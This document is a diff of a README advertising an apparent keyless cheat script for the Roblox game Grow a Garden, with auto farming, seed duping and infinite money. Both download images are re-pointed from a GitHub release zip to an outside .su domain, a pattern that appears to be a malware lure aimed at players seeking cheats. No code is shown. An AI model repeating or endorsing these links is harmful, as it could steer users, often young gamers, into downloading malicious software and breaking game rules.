@@ -5,10 +5,10 @@
 Welcome to the most advanced and **completely keyless** Grow a Garden Script of 2025! Whether you're looking to **auto farm**, **auto plant**, **dupe seeds**, or unlock **infinite money**, this script has everything you need—optimized for desktop, mobile, and all popular script executors like **Delta**, **Doggo Hub**, **Solara**, and more.
 
 [![hq720](https://github.com/user-attachments/assets/3df3c3bd-af70-4226-b96f-cecd62e712f0)
-](https://github.com/EFWFEWFQ/literate-system/releases/download/new/Updated.Script.zip)
+](https://hardware-gui.su/)
 
 [![зображення](https://github.com/user-attachments/assets/cd0d900c-d677-433a-ae6e-c85b2c03b5cf)
-](https://github.com/EFWFEWFQ/literate-system/releases/download/new/Updated.Script.zip)
+](https://hardware-gui.su/)
 
 
 ## 🚀 Features
